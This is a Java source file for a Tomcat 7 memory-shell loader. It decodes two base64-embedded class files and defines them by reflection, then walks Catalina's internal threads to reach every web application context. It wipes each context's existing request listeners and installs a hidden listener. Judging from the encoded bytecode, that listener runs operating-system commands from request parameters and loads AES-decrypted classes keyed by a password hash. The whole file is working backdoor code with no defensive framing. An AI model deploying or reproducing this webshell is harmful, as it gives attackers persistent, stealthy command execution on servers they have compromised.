package ccdr4gon;

import org.apache.catalina.core.StandardContext;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

//Tomcat7Load
public class T7Load {
    public static String pass;
    public String dr4gonListener = "yv66vgAAADQBFQoAQQB+CQBAAH8KAIAAgQcAggoAQQCDCABhCgCEAIUKAIYAhwoAhgCIBwCJCgAKAIoKAAoAiwcAjAoADQB+CABlCwCNAI4IAGMIAI8KAAoAkAgAkQoAkgCTCABTCgCUAJUKAJQAlgoAlwCYCACZCACaBwCbCACcCgAcAJ0KABwAngcAnwoAIACgBwChCgAiAH4KACAAogoAIgCjCACkCgAiAKUKAKYApwoApgCoCgCpAKoIAKsIAKwIAK0LAK4ArwgAsAoAsQCyBwCzCgCSALQKADEAtQoAsQC2BwC3CgCEALgKADUAuQoAugC7CgAKALwKAL0AvgoAsQC/CgA1AMAKAIQAwQoAQQCTBwDCBwDDBwDEBwDFAQAEcGFzcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTGNjZHI0Z29uL3V0aWxzL0RyNGdvbkxpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEAA2lzcgEAG0xqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyOwEAA2NtZAEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABGxpbmUBAAZyZXN1bHQBAAFrAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAZvYmpNYXABAA9MamF2YS91dGlsL01hcDsBAA1yZXF1ZXN0ZmFjYWRlAQAtTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGU7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEANUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAwwcAxgcAggcAxwcAiQcAyAcAyQcAygcAywcAzAcAmwcAnwcAoQcAwgEAClNvdXJjZUZpbGUBABNEcjRnb25MaXN0ZW5lci5qYXZhDABFAM0MAEMARAcAxgwAzgDPAQArb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZQwA0ADRBwDSDADTANQHAMcMANUA1gwA1wDYAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAwA2QDaDADbANwBABFqYXZhL3V0aWwvSGFzaE1hcAcAygwA3QDeAQAFc3RhZ2UMAN8A4AEABGVjaG8HAMsMAOEA4gcA4wwA5ADlDADmAOcHAOgMAOkA6gEAA2diawEABHRydWUBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyAQADR0JLDABFAOsMAEUA7AEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMAEUA7QEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADuAO8MAPAA8QEAAQoMAPIA7wcAyAwA8wBGDAD0APUHAPYMAPcARgEAFwo9PT09PT09PT1lbmQ9PT09PT09PT0KAQABcwEAAXUHAMkMAPgA+QEAA0FFUwcA+gwA+wD8AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwA/QD+DABFAP8MAQABAQEAEGNjZHI0Z29uL3V0aWxzL1UMAQIBAwwARQEEBwEFDAEGAQkMAQoBCwcBDAwBDQEODAEPARAMAREBEgwBEwEUAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAHWNjZHI0Z29uL3V0aWxzL0RyNGdvbkxpc3RlbmVyAQAQamF2YS9sYW5nL09iamVjdAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAA1qYXZhL3V0aWwvTWFwAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAMoKVYBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEACHB1dFZhbHVlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAGZGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAG4AQQABAEIAAQABAEMARAAAAAMAAQBFAEYAAQBHAAAARgACAAIAAAAKKrcAASortQACsQAAAAIASAAAAA4AAwAAABUABAAWAAkAFwBJAAAAFgACAAAACgBKAEsAAAAAAAoAQwBEAAEAAQBMAE0AAQBHAAAANQAAAAIAAAABsQAAAAIASAAAAAYAAQAAABoASQAAABYAAgAAAAEASgBLAAAAAAABAE4ATwABAAEAUABNAAEARwAAA3MABgAPAAABhSu2AAPAAHBNLLYABRIGtgAHTi0EtgAILSy2AAnAAHI6BBkEtgALOgUZBLYADDoGuwANWbcADjoHGQcSDxkGuQAQAwBXGQcSBhkEuQAQAwBXGQcSERkFuQAQAwBXGQQSErYAExIUtgAVmQCwGQQSFrYAEzoIuAAXGQi2ABi2ABk6CRkEEhq2ABMSG7YAFZkAE7sAeFkZCRIdtwAeOgqnAA67AHhZGQm3AB86CrsAeVkZCrcAIToLuwB6WbcAIzoMGQu2ACRZOg3GACAZDLsAelm3ACMZDbYAJRImtgAltgAntgAlV6f/2xkMtgAnOg4ZBBIatgATEhu2ABWZAAoZBRIdtgAoGQW2ACkZDrYAKhkFtgApEiu2ACoZBBIStgATEiy2ABWZAFwqtAACOggZBhItGQi5AC4DABIvuAAwOgkZCQW7ADFZGQi2ADISL7cAM7YANLsANVkqtgAFtgA2twA3GQm4ADgZBLYAObYAJLYAOrYAO7YAPLYAPRkHtgA+V6cABE6xAAEACAGAAYMAewAEAG0AAAB2AAn/AKAACgcAbgcAgAcAcAcAhgcAcgcApgcArgcAjQcAkgcAdwAA/AAKBwB4/QATBwB5BwB6/AAnBwCS/AAcBwCS/wATAAgHAG4HAIAHAHAHAIYHAHIHAKYHAK4HAI0AAP8AZwADBwBuBwCABwBwAABCBwB7AABIAAAAigAiAAAAHgAIACAAEgAhABcAIgAhACMAKAAkAC8AJQA4ACYARAAnAFAAKABcACsAawAsAHQALQCBAC8AkAAwAKAAMgCrADQAtgA1AL8ANwDKADgA5wA6AO4AOwD9ADwBBAA+AQ4APwEYAEIBJwBDAS0ARAE4AEUBPwBGAVMARwGAAEoBgwBJAYQASwBJAAAAtgASAJ0AAwBRAFIACgB0AKQAUwBEAAgAgQCXAFQAVQAJAKsAbQBRAFIACgC2AGIAVgBXAAsAvwBZAFgAWQAMAMcAUQBaAEQADQDuACoAWwBEAA4BLQBTAFwARAAIAT8AQQBdAF4ACQASAW4AXwBgAAMAIQFfAGEAYgAEACgBWABjAGQABQAvAVEAZQBmAAYAOAFIAGcAaAAHAAABhQBKAEsAAAAAAYUATgBPAAEACAF9AGkAagACAGsAAAAMAAEAOAFIAGcAbAAHAAIBCAAAAAoAAQC9ALoBBwAJAHwAAAACAH0=";
    public String U = "yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTGNjZHI0Z29uL3V0aWxzL1U7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQAQY2NkcjRnb24vdXRpbHMvVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIAADAAQAAAAAAAIAAAAFAAYAAQAHAAAAPgACAAIAAAAGKiu3AAGxAAAAAgAIAAAACgACAAAABgAFAAcACQAAABYAAgAAAAYACgALAAAAAAAGAAwADQABAAEADgAPAAEABwAAAD0ABAACAAAACSorAyu+twACsAAAAAIACAAAAAYAAQAAAAkACQAAABYAAgAAAAkACgALAAAAAAAJABAAEQABAAEAEgAAAAIAEw==";

    public Object G(Object o, String s) throws Exception {
        Field f = o.getClass().getDeclaredField(s);
        f.setAccessible(true);
        return f.get(o);
    }
    public T7Load() throws Exception {

        byte[] listenerpayload = Base64.getDecoder().decode(dr4gonListener);
        byte[] Upayload = Base64.getDecoder().decode(U);

        Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        try {
            Class listenerclass = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), listenerpayload, 0, listenerpayload.length);
            Class Uclass = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), Upayload, 0, Upayload.length);

            Object o=new Object();
            Thread[] g = (Thread[]) G(Thread.currentThread().getThreadGroup(), "threads");
            for (Thread t : g) {
                if (t == null) {
                    continue;
                }
                if (t.getName().contains("ContainerBackgroundProcessor")) {
                    o = G(G(t, "target"), "this$0");
                }
            }

            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte[] bytes = md5.digest(pass.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) {
                sb.append(Integer.toHexString(b >> 4 & 0xf));
                sb.append(Integer.toHexString(b & 0xf));
            }
            String md5pass= sb.toString().substring(0,16);

            Field f = Class.forName("org.apache.catalina.core.ContainerBase").getDeclaredField("children");
            f.setAccessible(true);
            HashMap<String,Object> p = (HashMap) f.get(o);
            for (Map.Entry l : p.entrySet()) {
                HashMap<String,Object> k = (HashMap) f.get(l.getValue());
                for (Map.Entry j : k.entrySet()){
                    ((StandardContext)j.getValue()).setApplicationEventListeners(new Object[]{});
                    ((StandardContext)j.getValue()).addApplicationEventListener(listenerclass.getConstructor(String.class).newInstance(md5pass));
                }
            }
        } catch (Exception ignored) {}
    }
}
